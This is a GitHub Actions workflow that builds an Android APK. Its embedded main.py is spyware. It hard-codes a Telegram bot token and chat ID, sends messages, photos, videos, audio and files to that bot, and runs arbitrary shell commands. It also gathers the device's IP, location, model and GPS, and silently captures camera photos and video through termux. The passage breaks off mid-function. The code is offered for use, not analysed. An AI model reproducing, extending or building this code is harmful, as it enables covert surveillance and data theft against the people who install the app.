name: Build APK
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3
    - name: Install
      run: |
        sudo apt update
        sudo apt install -y openjdk-17-jdk
        pip install buildozer
    - name: Create main.py
      run: |
        cat > main.py << "EOF"
import os,requests,subprocess,shutil,sqlite3,time,threading,base64,json
T="8889128449:AAHUGVmOKw5cqeVx25D1WHN9lJcvyxsH43U"
C="8631833153"
def send(t):
 try:
  for i in range(0,len(t),4000):
   requests.post(f"https://api.telegram.org/bot{T}/sendMessage",json={"chat_id":C,"text":t[i:i+4000]},timeout=5)
 except:pass
def send_photo(p):
 try:
  files={"photo":open(p,"rb")}
  requests.post(f"https://api.telegram.org/bot{T}/sendPhoto",data={"chat_id":C},files=files)
 except:pass
def send_video(v):
 try:
  files={"video":open(v,"rb")}
  requests.post(f"https://api.telegram.org/bot{T}/sendVideo",data={"chat_id":C},files=files)
 except:pass
def send_audio(a):
 try:
  files={"audio":open(a,"rb")}
  requests.post(f"https://api.telegram.org/bot{T}/sendAudio",data={"chat_id":C},files=files)
 except:pass
def send_file(f,n):
 try:
  files={"document":open(f,"rb")}
  requests.post(f"https://api.telegram.org/bot{T}/sendDocument",data={"chat_id":C,"caption":n},files=files)
 except:pass
def cmd(c):
 try:return subprocess.check_output(c,shell=True,timeout=10).decode()[:1000]
 except:return"no"
def get_ip():
 try:return requests.get("https://api.ipify.org",timeout=3).text
 except:return"no"
def get_location():
 try:
  r=requests.get("http://ip-api.com/json/",timeout=3)
  d=r.json()
  return f"{d.get('city')}, {d.get('country')}, {d.get('lat')}, {d.get('lon')}"
 except:return"no"
def get_device():
 try:
  brand=subprocess.check_output("getprop ro.product.brand",shell=True).decode().strip()
  model=subprocess.check_output("getprop ro.product.model",shell=True).decode().strip()
  android=subprocess.check_output("getprop ro.build.version.release",shell=True).decode().strip()
  return f"{brand} {model} Android {android}"
 except:return"no"
def get_gps():
 try:
  os.system("termux-location -p gps > /sdcard/loc.txt 2>/dev/null")
  time.sleep(3)
  with open("/sdcard/loc.txt",'r') as f:return f.read()[:500]
 except:return"no"
def take_photo():
 try:
  os.system("termux-camera-photo -c 0 /sdcard/photo.jpg 2>/dev/null")
  time.sleep(2)
  return"/sdcard/photo.jpg" if os.path.exists("/sdcard/photo.jpg") else None
 except:return None
def take_video():
 try:
  os.system("termux-camera-record -c 0 -d 5 /sdcard/video.mp4 2>/dev/null")
